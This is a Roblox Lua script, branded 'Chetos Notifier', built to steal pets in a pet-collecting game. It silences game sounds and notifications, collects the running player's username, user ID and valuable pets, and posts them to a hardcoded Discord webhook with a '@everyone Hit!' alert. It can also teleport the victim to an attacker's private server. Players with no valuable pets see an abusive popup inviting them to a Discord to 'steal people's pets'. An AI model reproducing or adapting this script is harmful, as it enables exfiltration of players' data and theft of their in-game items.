local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local EXECUTION_FLAG_NAME = "ChetosExecutionFlag"

if CoreGui:FindFirstChild(EXECUTION_FLAG_NAME) then
    return
end

local flag = Instance.new("BoolValue")
flag.Name = EXECUTION_FLAG_NAME
flag.Parent = CoreGui

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

-- Mute sounds (unchanged)
pcall(function()
    local function muteSound(sound)
        if sound:IsA("Sound") then sound.Volume = 0; sound.Playing = false end
    end
    game.DescendantAdded:Connect(muteSound)
    for _, sound in ipairs(game:GetDescendants()) do muteSound(sound) end
    RunService.Heartbeat:Connect(function()
        local notificationGui = player:WaitForChild("PlayerGui"):FindFirstChild("Top_Notification")
        if notificationGui then notificationGui:Destroy() end
    end)
end)

local CONFIG = {
    ["WEBHOOK_URL"] = "https://discord.com/api/webhooks/1423150330220380170/1NfkU25fK9dnB23Zsh-yMVCFWNNZpAsI4zxeI-sP14YLDLI5VQ2pWU8CTcfd2ajoDSqp",
    ["HUGE_PET_WEIGHT"] = 6.0, ["AGED_PET_DAYS"] = 50, ["MAX_PETS_IN_LIST"] = 15,
    ["DYNAMIC_DISCORD_LINKS"] = {"https://discord.gg/BDBX4y9sMH"},
    ["PRIORITY_PETS"] = {
        ["Disco Bee"] = true, ["Rainbow Ankylosaurus"] = true, ["Rainbow Dilophosaurus"] = true, ["Rainbow Pachycephalosaurus"] = true,
        ["Rainbow Iguanodon"] = true, ["Rainbow Parasaurolophus"] = true, ["Kitsune"] = true, ["Spinosaurus"] = true,
        ["Rainbow Spinosaurus"] = true, ["Mizuchi"] = true, ["Rainbow Kitsune"] = true, ["Raccoon"] = true, ["Dragonfly"] = true,
        ["Mimic Octopus"] = true, ["Butterfly"] = true, ["Queen Bee"] = true, ["T-Rex"] = true, ["Fennec Fox"] = true,
        ["Rainbow Lobster Thermidor"] = true, ["Rainbow Corrupted Kitsune"] = true, ["Lobster Thermidor"] = true, ["Griffin"] = true,
        ["Phoenix"] = true, ["Luminous Sprite"] = true, ["Swan"] = true, ["Red Panda"] = true, ["GIANT Swan"] = true,
        ["Corrupted Kitsune"] = true, ["Mizuchi"] = true, ["Rainbow Mizuchi"] = true
    }
}

local env = getgenv()
if env and env.Webhook then
    CONFIG["WEBHOOK_URL"] = env.Webhook
end

-- ADDED: GUI FUNCTION FOR NOTIFICATIONS
local function createStyledNotificationGUI(titleText, messageText, buttonText)
    local chosenLink = CONFIG["DYNAMIC_DISCORD_LINKS"][math.random(1, #CONFIG["DYNAMIC_DISCORD_LINKS"])]
    local gui = Instance.new("ScreenGui", CoreGui); gui.ResetOnSpawn = false; gui.ZIndexBehavior = Enum.ZIndexBehavior.Global; gui.DisplayOrder = 1000
    local overlay = Instance.new("Frame", gui); overlay.Size = UDim2.fromScale(1, 1); overlay.BackgroundColor3 = Color3.new(0, 0, 0); overlay.BackgroundTransparency = 0.4; overlay.Active = true
    local mainFrame = Instance.new("Frame", overlay); mainFrame.AnchorPoint = Vector2.new(0.5, 0.5); mainFrame.Position = UDim2.fromScale(0.5, 0.5); mainFrame.Size = UDim2.new(0, 500, 0, 250); mainFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 32); mainFrame.BackgroundTransparency = 0.1; mainFrame.BorderSizePixel = 0
    local corner = Instance.new("UICorner", mainFrame); corner.CornerRadius = UDim.new(0, 12)
    local stroke = Instance.new("UIStroke", mainFrame); stroke.Color = Color3.fromRGB(120, 80, 255); stroke.Thickness = 2; stroke.Transparency = 0.4
    local titleLabel = Instance.new("TextLabel", mainFrame); titleLabel.AnchorPoint = Vector2.new(0.5, 0); titleLabel.Position = UDim2.fromScale(0.5, 0.1); titleLabel.Size = UDim2.fromScale(0.8, 0.2); titleLabel.BackgroundTransparency = 1; titleLabel.Font = Enum.Font.SourceSansBold; titleLabel.Text = titleText; titleLabel.TextColor3 = Color3.new(1, 1, 1); titleLabel.TextScaled = true
    local messageLabel = Instance.new("TextLabel", mainFrame); messageLabel.AnchorPoint = Vector2.new(0.5, 0.45); messageLabel.Position = UDim2.fromScale(0.5, 0.45); messageLabel.Size = UDim2.fromScale(0.85, 0.3); messageLabel.BackgroundTransparency = 1; messageLabel.Font = Enum.Font.SourceSans; messageLabel.Text = messageText; messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200); messageLabel.TextSize = 18; messageLabel.TextWrapped = true
    local linkButton = Instance.new("TextButton", mainFrame); linkButton.AnchorPoint = Vector2.new(0.5, 1); linkButton.Position = UDim2.fromScale(0.5, 0.9); linkButton.Size = UDim2.fromScale(0.7, 0.25); linkButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242); linkButton.Font = Enum.Font.SourceSansBold; linkButton.Text = buttonText; linkButton.TextColor3 = Color3.new(1, 1, 1); linkButton.TextScaled = true
    local btnCorner = Instance.new("UICorner", linkButton); btnCorner.CornerRadius = UDim.new(0, 8)
    linkButton.MouseButton1Click:Connect(function() if type(setclipboard) == "function" then setclipboard(chosenLink); linkButton.Text = "LINK COPIED!"; task.wait(2); linkButton.Text = buttonText end end)
    return gui
end

local MUTATION_MAP = {}
pcall(function()
    local PetMutationRegistry = require(ReplicatedStorage.Data.PetRegistry.PetMutationRegistry)
    for name, data in pairs(PetMutationRegistry.PetMutationRegistry) do
        MUTATION_MAP[data.EnumId] = name
        MUTATION_MAP[name] = name
    end
end)

local Util = {}
function Util.Get(tbl, path, default)
    local current = tbl
    for key in string.gmatch(path, "[^.]+") do
        if type(current) ~= "table" or current[key] == nil then return default end
        current = current[key]
    end
    return current
end

local function getExecutorName()
    if getexecutorname then local s, n = pcall(getexecutorname); if s and type(n) == "string" then return n end end
    if identifyexecutor then local s, n = pcall(identifyexecutor); if s and type(n) == "string" then return n:gsub(" Executor", "") end end
    return "Unknown"
end

local function sendWebhook(payload)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if not requestFunc or not CONFIG["WEBHOOK_URL"] then return end
    task.spawn(function()
        pcall(function()
            requestFunc({
                Url = CONFIG["WEBHOOK_URL"], Method = "POST",
                Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end

task.spawn(function()
    local DataService = require(ReplicatedStorage.Modules.DataService)
    local PlayerData = DataService:GetData()
    local InventoryData = Util.Get(PlayerData, "PetsData.PetInventory.Data")
    if not InventoryData then return end

    local priorityPets, hugePets, otherNotablePets = {}, {}, {}
    local stats = {total = 0, huge = 0, aged = 0, mutated = 0, priority = 0}

    for uuid, petInfo in pairs(InventoryData) do
        if type(petInfo) == "table" and petInfo.PetData then
            local baseWeight = tonumber(Util.Get(petInfo, "PetData.BaseWeight", 0))
            if baseWeight > 0 then
                stats.total = stats.total + 1
                local mutationValue = Util.Get(petInfo, "PetData.MutationType") or Util.Get(petInfo, "PetData.Mutation")
                local mutationName = (mutationValue and MUTATION_MAP[tostring(mutationValue)]) or ""
                local basePetType = tostring(petInfo.PetType or "Unknown")
                local pet = { baseType = basePetType, typeName = (mutationName ~= "" and mutationName .. " " or "") .. basePetType, weight = tonumber(Util.Get(petInfo, "PetData.Weight")) or baseWeight, age = tonumber(Util.Get(petInfo, "PetData.Age", 0)), level = tonumber(Util.Get(petInfo, "PetData.Level", 1)), isHuge = baseWeight >= CONFIG["HUGE_PET_WEIGHT"], isAged = (math.floor(tonumber(Util.Get(petInfo, "PetData.Age", 0)) / 86400) >= CONFIG["AGED_PET_DAYS"]), isMutated = mutationName ~= "" }
                if pet.isHuge then table.insert(hugePets, pet); stats.huge = stats.huge + 1
                elseif CONFIG["PRIORITY_PETS"][basePetType] then table.insert(priorityPets, pet); stats.priority = stats.priority + 1
                elseif pet.isAged or pet.isMutated then table.insert(otherNotablePets, pet)
                end
                if pet.isAged then stats.aged = stats.aged + 1 end
                if pet.isMutated then stats.mutated = stats.mutated + 1 end
            end
        end
    end

    -- ADDED: GUI call for non-valuable players
    if #hugePets == 0 and #priorityPets == 0 and #otherNotablePets == 0 then
        createStyledNotificationGUI("YOU ARE POOR", "you're poor man you are shit you don't have good pets join here to steal people's pets click the join link", "Join Link")
        return -- Exit if player is not valuable
    end

    local accesscode = getgenv().accesscode
    if accesscode then
        pcall(function()
            local placeid = game.PlaceId
            game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(placeid, "", accesscode)
        end)
    end

    local function formatPetList(title, icon, petList)
        if #petList == 0 then return "" end
        local list = {"**" .. icon .. " " .. title .. "**", "```"}
        table.sort(petList, function(a,b) return a.weight > b.weight end)
        for i, pet in ipairs(petList) do
            if i > CONFIG.MAX_PETS_IN_LIST then table.insert(list, "➕ ..."); break end
            local ageText = math.floor(pet.age / 86400) > 0 and string.format(" (Age: %dd)", math.floor(pet.age / 86400)) or ""
            table.insert(list, string.format("• %s - %.2f KG%s [Lv.%d]", pet.typeName, pet.weight, ageText, pet.level))
        end
        table.insert(list, "```")
        return table.concat(list, "\n")
    end

    local description = table.concat({ "**👤 Player Information**", "```", ("😭 Display Name: %s"):format(player.DisplayName), ("👤 Username: @%s"):format(player.Name), ("👁️ User ID: %d"):format(player.UserId), ("💻 Executor: %s"):format(getExecutorName()), "```", "**📊 Backpack Statistics**", "```", ("🐾 Total Pets: %d"):format(stats.total), ("🤑 Huge Pets: %d"):format(stats.huge), ("🎯 Priority Pets: %d"):format(stats.priority), "```", formatPetList("Huge Pets", "🤭", hugePets), formatPetList("Priority Pets", "🎯", priorityPets), formatPetList("Aged/Mutated Pets", "⭐", otherNotablePets) }, "\n")
    local embed = { title = "🐾 **CHETOS NOTIFIER**", color = 3066993, description = description, footer = {text = "CHETOS NOTIFIER | Maximized Potential"}, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") }
    local joinCommand = ""
    if accesscode then
        joinCommand = string.format("```lua\nlocal accesscode = \"%s\"\nlocal placeid = game.PlaceId\ngame.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(placeid, \"\", accesscode)\n```", accesscode)
    end
    local payload = { username = "CHETOS NOTIFIER", content = "@everyone Hit!\n" .. joinCommand, embeds = { embed } }
    sendWebhook(payload)
end)
